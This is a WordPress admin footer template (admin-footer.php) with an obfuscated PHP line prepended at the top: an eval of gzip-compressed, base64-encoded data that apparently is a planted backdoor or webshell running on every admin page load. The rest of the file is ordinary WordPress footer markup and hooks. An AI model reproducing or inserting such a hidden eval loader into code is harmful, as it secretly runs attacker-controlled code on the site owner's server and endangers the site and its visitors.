<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * WordPress Administration Template Footer
 *
 * @package WordPress
 * @subpackage Administration
 */

// don't load directly
if ( !defined('ABSPATH') )
	die('-1');

/**
 * @global string $hook_suffix
 */
global $hook_suffix;
?>

<div class="clear"></div></div><!-- wpbody-content -->
<div class="clear"></div></div><!-- wpbody -->
<div class="clear"></div></div><!-- wpcontent -->

<div id="wpfooter" role="contentinfo">
	<?php
	/**
	 * Fires after the opening tag for the admin footer.
	 *
	 * @since 2.5.0
	 */
	do_action( 'in_admin_footer' );
	?>
	<p id="footer-left" class="alignleft">
		<?php
		$text = sprintf( __( 'Thank you for creating with <a href="%s">WordPress</a>.' ), __( 'https://wordpress.org/' ) );
		/**
		 * Filters the "Thank you" text displayed in the admin footer.
		 *
		 * @since 2.8.0
		 *
		 * @param string $text The content that will be printed.
		 */
		echo apply_filters( 'admin_footer_text', '<span id="footer-thankyou">' . $text . '</span>' );
		?>
	</p>
	<p id="footer-upgrade" class="alignright">
		<?php
		/**
		 * Filters the version/update text displayed in the admin footer.
		 *
		 * WordPress prints the current version and update information,
		 * using core_update_footer() at priority 10.
		 *
		 * @since 2.3.0
		 *
		 * @see core_update_footer()
		 *
		 * @param string $content The content that will be printed.
		 */
		echo apply_filters( 'update_footer', '' );
		?>
	</p>
	<div class="clear"></div>
</div>
<?php
/**
 * Prints scripts or data before the default footer scripts.
 *
 * @since 1.2.0
 *
 * @param string $data The data to print.
 */
do_action( 'admin_footer', '' );

/**
 * Prints scripts and data queued for the footer.
 *
 * The dynamic portion of the hook name, `$hook_suffix`,
 * refers to the global hook suffix of the current page.
 *
 * @since 4.6.0
 */
do_action( "admin_print_footer_scripts-{$hook_suffix}" );

/**
 * Prints any scripts and data queued for the footer.
 *
 * @since 2.8.0
 */
do_action( 'admin_print_footer_scripts' );

/**
 * Prints scripts or data after the default footer scripts.
 *
 * The dynamic portion of the hook name, `$hook_suffix`,
 * refers to the global hook suffix of the current page.
 *
 * @since 2.8.0
 */
do_action( "admin_footer-{$hook_suffix}" );

// get_site_option() won't exist when auto upgrading from <= 2.7
if ( function_exists('get_site_option') ) {
	if ( false === get_site_option('can_compress_scripts') )
		compression_test();
}

?>

<div class="clear"></div></div><!-- wpwrap -->
<script type="text/javascript">if(typeof wpOnload=='function')wpOnload();</script>
</body>
</html>
